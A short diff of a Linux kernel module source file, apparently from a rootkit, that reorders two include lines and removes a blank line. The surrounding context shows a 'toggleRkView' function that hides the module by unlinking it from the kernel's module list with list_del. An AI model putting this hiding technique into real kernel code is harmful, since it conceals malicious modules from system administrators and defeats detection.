@@ -1,5 +1,5 @@
-#include "../include/core.h"
 #include "../include_modules/hide.h"
+#include "../include/core.h"
 
 static struct list_head *prev_module;
 static short hidden = 0;
@@ -12,6 +12,5 @@ void toggleRkView(void) {
         prev_module = THIS_MODULE->list.prev;
         list_del(&THIS_MODULE->list);
         hidden = 1;
-
     }
 }
